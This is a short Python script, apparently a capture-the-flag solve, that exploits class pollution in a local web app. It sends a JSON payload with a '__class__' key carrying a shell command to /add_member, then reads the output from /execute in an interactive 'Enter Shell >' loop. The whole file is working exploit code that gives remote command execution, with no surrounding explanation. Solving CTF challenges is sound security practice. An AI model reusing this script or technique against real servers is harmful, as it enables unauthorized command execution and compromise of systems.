import requests
import json

class Solve:
    def __init__(self, baseURL):
        self.baseURL = baseURL
        self.command = None
        self.payload = {}
    
    def set_command(self, cmd):
        self.command = cmd
        self.payload = {
            "name": "bl4ck0ut",
            "role": "principal",
            "__class__": {"cmd": self.command}
        }
    def send_payload(self):
        print(f"[+] Sending with payload: {self.command}")
        url = f"{self.baseURL}/add_member"
        response = requests.post(url, json=self.payload)
        if response.status_code in (200, 302):
            print(f"[+] Sending Payload Successfully")
            return True
        else:
            print(f"[-] Sending Payload Failed")
            return False
    def excute_command(self):
        print(f"[+] Access /execute Get Output Shell")
        url = f"{self.baseURL}/execute"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            print(f"[+] Command Ouput: \n")
            print(data.get("result"))
        else:
            print(f"[+] /execute failed. try again!")
    
    def execute(self):
        if self.send_payload():
            self.excute_command()

if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1:5000"
    solve = Solve(BASE_URL)
    while True:
        command = input("Enter Shell > ")
        if command.lower() in ("exit", "quit"):
            print(f"[+] Bye Fen !")
            break
        solve.set_command(command)
        solve.execute()